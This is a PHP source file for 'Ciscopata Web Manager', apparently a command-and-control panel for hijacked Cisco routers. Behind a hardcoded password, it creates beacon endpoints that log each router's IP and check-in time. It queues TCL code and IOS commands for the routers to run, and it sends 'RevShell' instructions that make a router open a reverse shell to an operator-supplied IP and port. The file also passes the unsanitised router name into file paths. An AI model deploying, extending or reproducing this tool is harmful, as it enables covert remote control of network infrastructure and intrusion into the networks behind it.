<?
session_start();
if (!$_SESSION['auth']) {
 if ($_POST) {
  if ($_POST['pass'] == 'ciscopata') {
   $_SESSION['auth'] = true;
   header("location: .");
   exit;
  } else print "No no no...<br>\n";
 }
 ?>
<html><head>
<meta http-equiv="refresh" content="20"/>
<title>Ciscopata Web Manager</title></head><body>
<img src="ciscopata.png"/><br>
<form method=POST><input type=password size=20 name=pass><input type=submit value=ok></form>
 <?
 exit;
} else {
 if ($_GET) {
  $c = escapeshellcmd($_GET['c']);
  $n = $_GET['n'];
  if ($c == 'logout') {
   session_destroy();
   header("location: .");
   exit;
  }
  if ($c == 'add') {
   if ($n) {
    mkdir("../C_$n");
    $f = fopen("../C_$n/index.php", "w");
    fputs($f, "<?php\nheader(\"Content-type: text/plain\");\n");
    fputs($f, "if(file_exists(\"cmd\")) {\n\$f=fopen(\"cmd\",\"r\");\n");
    fputs($f, "print fgets(\$f,2048).\"\\n\";fclose(\$f);unlink(\"cmd\");}\n");
    fputs($f, "\$f=fopen(\"last\",\"w\");fputs(\$f,time());fclose(\$f);\n");
    fputs($f, "\$f=fopen(\"ip\",\"w\");fputs(\$f,\$_SERVER['REMOTE_ADDR']);fclose(\$f);\n");
    fclose($f);
    header('location: .');
    exit;
   }
  }
  if ($c == 'rem') {
   if ($n) {
    if(file_exists("../C_$n/ip"))unlink("../C_$n/ip");
    if(file_exists("../C_$n/last"))unlink("../C_$n/last");
    if(file_exists("../C_$n/cmd"))unlink("../C_$n/cmd");
    if(file_exists("../C_$n/index.php"))unlink("../C_$n/index.php");
    rmdir("../C_$n");
    header('location: .');
    exit;
   }
  }
 }
 if ($_POST) {
  $r = $_POST['router'];
  $tipo = $_POST['tipo'];
  $cmd = $_POST['cmd'];
  if ($tipo == 'tcl') {
   $f = fopen("../C_$r/cmd", "a");
   fputs($f,"$cmd\n");
   fclose($f);
  }
  if ($tipo == 'ios') {
   $f = fopen("../C_$r/cmd", "a");
   fputs($f,"exec $cmd\n");
   fclose($f);
  }
  if ($tipo == 'rsh') {
   $f = fopen("../C_$r/cmd", "a");
   $cmd = explode(":",$cmd);
   fputs($f,"RevShell ".$cmd[0]." ".$cmd[1]." $r\n");
   fclose($f);
  }
 }
}
?>
<html>
<body>
<pre>
<table border=0><tr><td>
<img width="160" style="position:relative" src="ciscopata.png"/>
</td><td>
<h3>Ciscopata Web Manager v1.0</h3>
<small>por: <a href="mailto:xenomuta@gmail.com?subject=Ciscopata+Web+Manager">XenoMuta</a> - <a href="https://github.com/xenomuta/ciscopata">https://github.com/xenomuta/ciscopata</a></small>
</td></tr></table>
<pre>
<hr>
<div id="menu">
<b>MENU</b>
<a href="#agrega" onClick="top.location='?c=add&n='+prompt('Nombre del router');">agrega</a> * <a href="?c=ref">refrescar</a> * <a href="?c=logout">salir</a>

<b>ROUTERS</b>
<i>Leyenda:
<b>:(</b>  Desconectado (mas de 30 segundos sin reportarse)
<b>:)</b>  Esperando comandos
<b>&gt;:(</b> Desconectado con comandos pendientes
<b>&gt;:)</b> Con comandos pendientes</i>

<?php
$d = dir("..");
while($f = $d->read()) {
 if (substr($f,0,2)=="C_") {
  print "<div onMouseOver=\"this.style.backgroundColor='#afefaf'\" onMouseOut=\"this.style.backgroundColor='white'\" style=\"padding:5px;border:black dashed 1px\">";
  $f = substr($f,2);
  $last = 0;
   print "* ";
  $ip = "";
  if(file_exists("../C_$f/ip")) $ip = file_get_contents("../C_$f/ip");
  if(file_exists("../C_$f/last")) $last += file_get_contents("../C_$f/last");
  if(file_exists("../C_$f/cmd"))
   if(time() - $last < 30) print "<b>&gt;:)</b> ";
   else print "<b>&gt;:(</b> ";
  elseif(time() - $last < 30) print "<b>:)</b> ";
  else print "<b>:(</b> ";
  print "$f - Exec: ";
  print "<a href=\"javascript:ios('$f');\">[ios]</a> ";
  print "<a href=\"javascript:tcl('$f');\">[tcl]</a> - ";
  print "<a href=\"javascript:rsh('$f');\">[revshell]</a> ";
  if($ip) print "<a href=\"telnet://$ip\">[telnet $ip]</a> ";
  else print "(ip?) ";
  print "<a href=\"?c=rem&n=$f\" onClick=\"return confirm('Seguro quiere remover a $f?');\">[remover]</a>\n";
  print "</div>";
 }
}
?>
<form id=fcmd method=POST>
<input type=hidden name=tipo>
<input type=hidden name=router>
<input type=hidden name=cmd>
</form>
</div>
</pre>
<script>
function tcl(r) {
 var f=document.getElementById('fcmd');
 f.router.value = r;
 f.tipo.value = 'tcl';
 if(!(f.cmd.value = prompt('Entre el codigo TCL a ejecutar'))) {
  return false;
 }
 f.submit();
}
function ios(r) {
 var f=document.getElementById('fcmd');
 f.router.value = r;
 f.tipo.value = 'ios';
 if(!(f.cmd.value = prompt('Entre el comando IOS a ejecutar'))) {
  return false;
 }
 f.submit();
}
function rsh(r) {
 var f=document.getElementById('fcmd');
 f.router.value = r;
 f.tipo.value = 'rsh';
 if(!(f.cmd.value = prompt('Entre la IP:Puerto'))) {
  return false;
 }
 f.submit();
}
</script>
</body>
</html>
